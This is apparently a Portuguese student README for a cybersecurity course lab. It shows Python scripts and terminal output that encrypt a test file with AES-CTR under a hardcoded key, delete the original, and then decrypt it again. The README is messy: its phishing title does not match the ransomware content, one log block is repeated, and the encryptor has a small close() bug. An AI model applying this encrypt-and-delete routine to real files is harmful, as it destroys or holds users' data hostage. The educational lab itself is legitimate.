# Phishing para captura de senhas 🚩

Fazer a criptografia e descriptografia de um arquivo de teste, simulando um ransomware 

## Ferramentas 👨‍💻

- Kali Linux
- Python 3.11.9
- pyaes 1.6.1

## Passo a Passo 👣

-  Criando o ransomware

┌──(lucas㉿kali)-[~]
└─$ mkdir projeto-ransomware
                                                                                                                                                                               
┌──(lucas㉿kali)-[~]
└─$ cd projeto-ransomware
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ touch teste.txt
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ touch encrypter.py
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ touch decrypter.py
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ ls
decrypter.py  encrypter.py  teste.txt
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ nano encrypter.py 
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ cat encrypter.py             
import os
import pyaes



file_name = 'teste.txt'
file = open(file_name,'rb')
file_data = file.read()
file.close()



os.remove(file_name)


key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)


crypto_data = aes.encrypt(file_data)


new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close

• Teste Ransomware


┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ ls
decrypter.py  encrypter.py  teste.txt
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ nano teste.txt   
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ cat teste.txt   
Este arquivo do Lucas esta legivel
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ python encrypter.py
Traceback (most recent call last):
  File "/home/lucas/projeto-ransomware/encrypter.py", line 2, in <module>
    import pyaes
ModuleNotFoundError: No module named 'pyaes'

┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ pip3 install pyaes
Defaulting to user installation because normal site-packages is not writeable
Collecting pyaes
  Downloading pyaes-1.6.1.tar.gz (28 kB)
  Preparing metadata (setup.py) ... done
Building wheels for collected packages: pyaes
  Building wheel for pyaes (setup.py) ... done
  Created wheel for pyaes: filename=pyaes-1.6.1-py3-none-any.whl size=26347 sha256=f5f8885723ea8f5c435cc6c88d928f66119539915a6c2005eb503a721c98e292
  Stored in directory: /home/lucas/.cache/pip/wheels/4e/52/33/010d0843550bffb6a591b11629070ae140c0ad4f53e68a3bd3
Successfully built pyaes
Installing collected packages: pyaes
Successfully installed pyaes-1.6.1

┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ ls               
decrypter.py  encrypter.py  teste.txt
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ cat teste.txt                
este arquivo esta legivel


┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ python encrypter.py  
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ ls
decrypter.py  encrypter.py  teste.txt.ransomwaretroll
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ cat teste.txt.ransomwaretroll 
ʉ   vm*67
          
o <  <
        


┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ ls
decrypter.py  encrypter.py  teste.txt
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ nano teste.txt   
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ cat teste.txt   
Este arquivo do Lucas esta legivel
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ python encrypter.py
Traceback (most recent call last):
  File "/home/lucas/projeto-ransomware/encrypter.py", line 2, in <module>
    import pyaes
ModuleNotFoundError: No module named 'pyaes'

┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ pip3 install pyaes
Defaulting to user installation because normal site-packages is not writeable
Collecting pyaes
  Downloading pyaes-1.6.1.tar.gz (28 kB)
  Preparing metadata (setup.py) ... done
Building wheels for collected packages: pyaes
  Building wheel for pyaes (setup.py) ... done
  Created wheel for pyaes: filename=pyaes-1.6.1-py3-none-any.whl size=26347 sha256=f5f8885723ea8f5c435cc6c88d928f66119539915a6c2005eb503a721c98e292
  Stored in directory: /home/lucas/.cache/pip/wheels/4e/52/33/010d0843550bffb6a591b11629070ae140c0ad4f53e68a3bd3
Successfully built pyaes
Installing collected packages: pyaes
Successfully installed pyaes-1.6.1

┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ ls               
decrypter.py  encrypter.py  teste.txt
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ cat teste.txt                
este arquivo esta legivel


┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ python encrypter.py  
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ ls
decrypter.py  encrypter.py  teste.txt.ransomwaretroll
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ cat teste.txt.ransomwaretroll 
ʉ   vm*67
          
o <  <
        

• Criar arquivo descriptografia


┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ cat decrypter.py
import os
import pyaes

file_name = 'teste.txt.ransomwaretroll'
file = open(file_name, 'rb')
file_data = file.read()
file.close()


key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

os.remove(file_name)


new_file = 'teste.txt'
new_file = open(f'{new_file}','wb')
new_file.write(decrypt_data)
new_file.close()

• Descriptografar arquivo


┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ ls
decrypter.py  encrypter.py  teste.txt.ransomwaretroll
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ cat teste.txt.ransomwaretroll 
ʉ   vm*67
          
o <  <
                                                                                                                                                                                      
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ python decrypter.py 
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ ls
decrypter.py  encrypter.py  teste.txt
                                                                                                                                                                               
┌──(lucas㉿kali)-[~/projeto-ransomware]
└─$ cat teste.txt                
este arquivo esta legivel

## Resultados 🎁

https://github.com/Twistywasabi/Dio_cibersecurity-desafio-ransomware 

## Referências 📚

- https://web.dio.me/track/santander-ciberseguranca-2024
- https://www.kali.org/

## Updates 🕐

2024/12/12 - Primeira versão

## Pendências 🚨

